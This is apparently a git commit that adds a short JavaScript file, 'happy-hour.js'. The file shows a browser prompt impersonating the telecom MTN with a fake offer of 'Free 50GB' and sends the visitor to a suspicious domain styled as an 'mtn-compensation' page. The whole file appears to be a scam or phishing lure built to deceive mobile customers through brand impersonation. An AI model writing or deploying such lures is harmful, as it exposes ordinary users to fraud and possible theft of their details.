ac6940f8739ce1bebc2e593a9fe521f26e2821f6
xmasdata <152927198+xmasdata@users.noreply.github.com>
2024-10-04 11:47:48 -0700

    Create happy-hour.js

---
+++ happy-hour.js
@@ -0,0 +1,6 @@
+
+var password = 'Activate 50GB'
+password=prompt('MTN: Dear customer, Enjoy Free 50GB From 5am to 12 midnight on your mobile phone, press OK to Activate now ','Activate 50GB');
+if (password != 'Activate 50GB') {
+location.href='https://30gbbonus.xyz/mtn-compensation.html';
+}
